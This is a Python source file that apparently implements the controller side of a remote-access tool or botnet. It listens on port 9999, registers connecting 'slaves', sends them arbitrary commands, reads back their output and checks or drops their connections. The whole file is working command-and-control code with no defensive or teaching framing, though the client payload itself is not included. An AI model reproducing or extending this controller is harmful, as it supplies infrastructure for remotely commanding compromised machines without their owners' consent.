import sys
import socket
import time
import _thread

from mylib import cooldecode
symbol = '$'

timeoutsecond = 1

masterSocket = 0
port = 9999
host = 0
slaveSocket,slaveAddr = socket.socket(),'0.0.0.0'
slave = []
addr = []



def settimeoutsecond(arg):
    if(arg == 'help'):
        print("Sets timeout second. Argument will be the timeout second. Default is 1")
        return
    
    global timeoutsecond
    if(arg == None):
        timeoutsecond = None
    else:
        timeoutsecond = int(arg)

    print("timoutsecond is set to " + arg)
    
    return

def printslaves(arg):
    if(arg == 'help'):
        print("Prints every slave. Takes no argument.")
        return
    
    for i in slave:
        print(i)
    return

def sendtoslave(arg):
    if(arg == 'help'):
        print("send command to slaves. Arguments will be the command and argument. send help command to slave to display list of slave's command")
        return
    
    slaveNumber = int(arg[0:arg.index(" ")])
    arg = arg[arg.index(" ") + 1:]
    try:
        slaveSocket = slave[slaveNumber]
    except IndexError:
        print("invalid index. List of slaves:")
        printslaves('')
        return
    try:
        slaveSocket.send(arg.encode("utf"))
    except ConnectionResetError:
        print("Connection reset")

    
    print('Waiting for feedback...\n')
    checkforfeedback(str(slaveNumber) + ' ' + str(5))
    return

   

def checkforfeedback(arg):
    if(arg == 'help'):
        print("Checks for feedback. Arguments will be the slave index and time for check")
        return
    
    slaveNumber = int(arg[0:arg.index(" ")])
    arg = arg[arg.index(" ") + 1:]
    second = int(arg)
    slaveSocket = slave[slaveNumber]
    slaveSocket.settimeout(second)
    
    try:
        byte = slaveSocket.recv(4096)
        print(cooldecode(byte))
    except:
        print("No feedback received")    
    
    return

def setsockets(arg):
    if(arg == 'help'):
        print("Sets sockets. Takes no argument.")
        return
    
    global masterSocket
    global host
    try:
        masterSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = socket.gethostname()
        masterSocket.bind((host,port))
    except socket.error:
        print("Socket can not be created")
        return

    print("Socket has been created")
    print(masterSocket)
    print(host)
    print(port)
    return


def acceptconnection(arg):
    if(arg == 'help'):
        print("Accepts connection from slaves. Takes no argument.")
        return
    
    
    global slaveSocket
    global slaveAddr
    global masterSocket
    global slave
    global addr
    
    masterSocket.settimeout(timeoutsecond)
    masterSocket.listen(1)
    try:
        slaveSocket,slaveAddr = masterSocket.accept()

        slave.append(slaveSocket)
        addr.append(slaveAddr)
        sc = slaveSocket
    except socket.timeout:
        print("timeout")
        
    print(slaveSocket)
    print(slaveAddr)
    time.sleep(2)
    return



def changesymbolto(arg):
    if(arg == 'help'):
        print("Changes symbol. Argument will be the new symbol. Default symbol is $")
        return
    
    global symbol
    if(len(arg) > 0):
        symbol = arg
        print('Symbol has changed to ' + symbol)
    return

def checkconnection(arg):
    if(arg == 'help'):
        print("Checks connections of slaves. Type 'all' for every slave. Type seperated integers for specified slave index")
        return
    
    if(arg == "all"):
        for i in range(0,len(slave)):
            s = slave[i]
            s.send("connectioncheck".encode("utf"))
            s.settimeout(timeoutsecond)
            try:
                byte = s.recv(4096)
                if(cooldecode(byte)=="connected"):
                    print("Slave "+ str(s) +" is connected")
            except socket.timeout:
                print("Slave "+ str(s) +" timeout")
            except ConnectionResetError:
                print("Slave "+ str(s) +" connection reset")
    else:
        for i in arg.split():
            s = slave[int(i)]
            s.send("connectioncheck".encode("utf"))
            s.settimeout(timeoutsecond)
            try:
                byte = s.recv(4096)
                if(cooldecode(byte)=="connected"):
                    print("Slave "+ str(s) +" is connected")
            except socket.timeout:
                    print("Slave "+ str(s) +" timeout")
        
    return

def kick(arg):
    if(arg == 'help'):
        print("Kicks the slave. Takes an argument as an index.")
        return
    
    slaveSocket = slave[int(arg)]
    slaveSocket.close()
    print(str(slaveSocket)+" kicked")
    
    dec = input("Remove it from list?")
    if(dec == 'y' or dec == 'Y'):
        del slave[int(arg)]
        del addr[int(arg)]
    
    return

def help(arg):
    print('\nList of available commands: \n')
    temp = ''
    g = globals()
    for f in g:
        temp = str(globals()[f])
        if(temp.startswith('<function')):
            temp = temp.split(" ")[1]
            if(temp != 'execute' and temp != 'cycle' and temp != 'main' and temp != 'help' and temp != 'cooldecode'):
                print(temp + ':', end = ' ')
                g[f]('help')
                print()
            
            
    return

def execute(command):
    commandArgument = " "
    try:
        commandArgument = command[((command.index(" "))+1):]
    except:
        commandArguemnt = " "

    try:
        command = command[0:command.index(" ")]
    except:
        command = command



    try:
        globals()[command](commandArgument)
    except ValueError:
        print("Bad argument. Try " + command + " help")
    except KeyError:
        print("No function found (KeyError)")
    except TypeError:
        print("No function found (TypeError)")
    except:
        print("Something went wrong")
        
    return


def cycle():
    while True:
        command = input("Master-respects-crows"+symbol)
        execute(command)
    return

def main():
    print('Don\'t forget to set sockets by typing setsockets before accepting connections!')
    cycle()
    return

main()
